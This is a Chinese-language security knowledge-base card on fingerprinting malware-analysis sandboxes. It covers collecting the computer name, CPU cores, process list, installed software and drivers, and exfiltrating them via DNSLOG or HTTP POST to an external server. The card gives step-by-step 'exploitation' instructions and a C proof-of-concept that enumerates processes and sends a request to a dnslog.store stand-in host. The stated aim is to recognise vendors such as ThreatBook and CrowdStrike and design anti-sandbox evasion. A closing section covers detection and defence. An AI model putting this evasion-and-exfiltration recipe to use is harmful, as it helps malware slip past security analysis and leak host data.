---
id: code-analysis-reverse-anti-debug-sandbox-fingerprint-collect-dnslog
title: 沙箱指纹采集方法：采集主机名/CPU/进程/驱动/软件并经 DNSLOG/HTTP 外带比对
type: scenario
domain: code-analysis
path: code-analysis/reverse/anti-debug
technique: sandbox-fingerprint-collection-dnslog-exfil
tags:
- anti-sandbox
- evasion
- sandbox
- fingerprint
- process-enumeration
- dnslog
- windows
- threatbook
- crowdstrike
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:47:24+08:00'
  notes: 已对照原文全文与图01-13核对：图01 DNSLOG HTTP 请求代码、图02 微步沙箱动态检测（Win10 1903）执行流、图03 DNSLOG 记录、图04-05 GetVersionEx 与注册表 Uninstall DisplayName 枚举、图06 微步系统环境探测报告、图07 外带 OS/软件列表、图09/11 接收端 Computer Name/CPU/DESKTOP 主机与进程列表、图12-13 Detonate.exe 检索与进程快照；卡片所述 116 进程（去 svchost 后 59）、Detonate.exe=微步特征、CrowdStrike/UnThreat 进程与原文一致。affected_versions 原文未声明。未在本机编译执行采集程序。
url: /docs/code-analysis/reverse/anti-debug/code-analysis-reverse-anti-debug-sandbox-fingerprint-collect-dnslog/
draft: false
kb_aliases:
- 沙箱指纹采集
- 沙箱分析记录
- 系统信息外带
- Detonate.exe 微步沙箱
- 进程快照沙箱识别
- DNSLOG 外带系统信息
---

## 一句话结论

在未知沙箱/虚拟机中运行自写的采集程序，收集计算机名、CPU 核心数、完整进程列表、驱动文件、已安装软件与 OS 版本，通过 DNSLOG/HTTP POST 外带到外部服务器，再与已知环境特征比对（如 `Detonate.exe` 出现在微步沙箱、`csfalconservice.exe`/`CSFalconContainer.exe` 为 CrowdStrike EDR、`UnThreat.exe`/`utsvc.exe` 为 UnThreat 杀软、随机命名的样本进程），即可识别沙箱厂商与环境，为后续反沙箱/行为规避提供依据。

## 原理

- **沙箱暴露的宿主级痕迹**：沙箱通常在虚拟机中运行样本，样本可读取来宾系统的计算机名、CPU 核心数、完整进程列表、驱动文件、安装软件与 OS 版本；这些信息受沙箱镜像与预装软件影响，具有一定的厂商特征。
- **采集方式**：
  - 计算机名：`GetComputerNameA`；
  - CPU 核心数：`GetSystemInfo().dwNumberOfProcessors`；
  - 进程：`CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)` + `Process32First/Process32Next` 遍历（比直接按 PID 查询更完整）；
  - 已安装软件：枚举注册表 `Uninstall` 键的 `DisplayName`；
  - OS 版本：`GetVersionEx` / `RtlGetVersion`；
  - 驱动/文件：遍历 `C:\Program Files\Common Files\VMware` 等目录并读取版本与签名。
- **外带通道**：DNSLOG 用于低成本连通性验证（构造唯一子域名发起 HTTP/DNS 请求，平台记录来源 IP 与时间）；批量数据用 HTTP POST 到自建服务器，避免 DNS 查询长度限制。外带同时暴露沙箱出口 IP 段，可作为额外指纹。
- **指纹比对**：把采集结果与已知沙箱/EDR/杀软进程名、驱动文件名、目录结构对照。原文在微步沙箱中取到 116 个进程（去掉 `svchost.exe` 后 59 个），其中 `Detonate.exe` 经检索只出现在病毒样本分析与微步沙箱分析帖中，判断为微步沙箱特征；同时观察到 CrowdStrike EDR 与 UnThreat 杀软进程、随机命名的 `dVbLgmPuXy.exe`。
- **为什么需要多维**：主机名、CPU 核心数等单一维度误报率高；不同沙箱/虚拟机特征各异，应组合进程、驱动、注册表、文件版本/签名、网络出口等多个维度综合判定。
- **为什么成立**：沙箱为了运行样本必须暴露真实系统接口；样本在“被分析”阶段拥有与普通用户进程相同的查询权限，采集行为本身不依赖漏洞，只依赖 API/注册表可读。

## 触发条件

- 样本/程序能在目标沙箱或虚拟机中执行，且可调用 Win32 API、读注册表与文件系统。
- 有可用的外带通道（DNSLOG、HTTP/HTTPS 到攻击者服务器），沙箱未完全阻断出网。
- 具备已知沙箱/EDR/杀软/虚拟机的进程、驱动、文件版本等特征库（可逐步积累）。
- 采集行为本身可能被沙箱标记为“系统环境探测”，需评估暴露风险。

## 利用步骤

1. 编写采集程序：获取计算机名、CPU 核心数、OS 版本、完整进程列表、安装软件列表、关键驱动目录文件与版本。
2. 先在本机测试采集与 HTTP 外带（如原文 `Sanbox_Test.exe` 向自建 HTTP 服务器 POST）。
3. 上传到目标沙箱（如微步社区沙箱）执行，观察动态分析报告与外带服务器日志。
4. 用 DNSLOG 做连通性验证：程序向 `<unique>.dnslog.store` 发起请求，平台记录解析来源 IP/时间。
5. 收集返回数据（如 `Computer Name: DESKTOP-IDTSVTR`、`CPU Cores: 2`、进程列表、安装软件、TempFiles/DesktopFiles/DiskInfos）。
6. 与已知特征比对：识别 `Detonate.exe`（微步）、CrowdStrike/UnThreat 进程、VMware 驱动等；把新发现的环境特征补充进特征库。
7. 综合多维特征设计反沙箱判断逻辑，避免单一维度误报。

## PoC

```c
// 采集片段（原文结构，未在本机编译执行）
char computerName[MAX_COMPUTERNAME_LENGTH + 1];
DWORD size = sizeof(computerName);
GetComputerNameA(computerName, &size);

SYSTEM_INFO si; GetSystemInfo(&si);
int cores = si.dwNumberOfProcessors;

HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe = { sizeof(pe) };
if (Process32First(snap, &pe)) {
    do { /* 记录 pe.szExeFile */ } while (Process32Next(snap, &pe));
}

// 外带：HTTP GET/POST 到 dnslog/自建服务器
std::string req = "GET / HTTP/1.1\r\nHost: <unique>.dnslog.store\r\nConnection: close\r\n\r\n";
send(clientSocket, req.c_str(), req.length(), 0);
```

## 变体与关联

- [[code-analysis-reverse-anti-debug-weibu-release-dir-regex-sandbox-check]]：微步沙箱的另一个强指纹（`C:\<随机目录>` 工作目录），可与本卡的进程/软件维度组合。
- [[code-analysis-reverse-anti-debug-sandbox-environment-checks]]、[[code-analysis-reverse-anti-debug-windows-sandbox-fingerprint-parent-check]]：反沙箱检查项组合与父进程校验。
- [[code-analysis-reverse-anti-debug-domain-join-vbox-driver-check]]、[[code-analysis-reverse-anti-debug-festi-vmware-backdoor-vpcext]]、[[code-analysis-reverse-anti-debug-cpuid-hypervisor-bit-intel-model-gate]]：虚拟机/驱动/CPUID 维度的检测。
- [[code-analysis-reverse-anti-debug-vmware-driver-version-signature-differential]]：从本卡驱动采集延伸出的 VMware 宿主/来宾差异指纹。
- 变体：外带可换 DNS/HTTPS/ICMP；采集项可加入 MAC OUI、磁盘序列号、USB 历史、注册表机器 GUID、桌面文件数、uptime 等。
- 边界：沙箱完全断网、API 被拦截/伪造、采集行为被判定为高风险并终止分析时，无法取得数据。

## 检测与防御

- 检测（沙箱/分析平台视角）：样本进程枚举全部进程、读 Uninstall 注册表、访问 VMware 驱动目录、向外发起 DNS/HTTP 请求；报告中的“系统环境探测”行为标签。
- 防御（沙箱厂商）：对进程/驱动/软件信息做虚拟化与随机化，隐藏或重命名特征进程，限制样本读取宿主机特征，监控并阻断异常外带；分析报告将环境探测标为高危行为。
- 防御（企业）：EDR 监控异常进程枚举与 DNS/HTTP 外带；限制终端出网；对可疑样本使用可控沙箱并隔离网络。
